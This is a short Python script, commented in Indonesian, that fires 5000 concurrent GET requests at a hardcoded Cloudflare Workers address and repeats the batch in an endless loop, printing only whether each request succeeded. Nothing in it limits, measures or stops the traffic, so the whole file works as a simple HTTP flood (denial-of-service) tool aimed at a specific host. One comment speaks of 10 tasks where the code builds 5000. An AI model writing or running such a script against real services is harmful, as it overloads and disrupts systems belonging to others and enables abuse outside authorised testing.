import aiohttp 
import asyncio  

async def send_request(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                response_text = await response.text()
                return response_text
    except Exception as e:
        return None

async def main():
    default_url = 'https://sxtcp.tg-index.workers.dev'  # URL default
    num_requests = 5000 # Jumlah permintaan yang ingin Anda kirim

    while True:
        # Inisialisasi list untuk menyimpan hasil respons
        responses = []

        # Buat daftar 10 tugas untuk mengirim permintaan
        tasks = [send_request(default_url) for _ in range(num_requests)]

        # Jalankan tugas-tugas secara bersamaan
        responses = await asyncio.gather(*tasks)

        # Handle hasil respons di sini
        for response in responses:
            if response is not None:
                print('Success')
            else:
                print('Failed')

if __name__ == "__main__":
    asyncio.run(main())
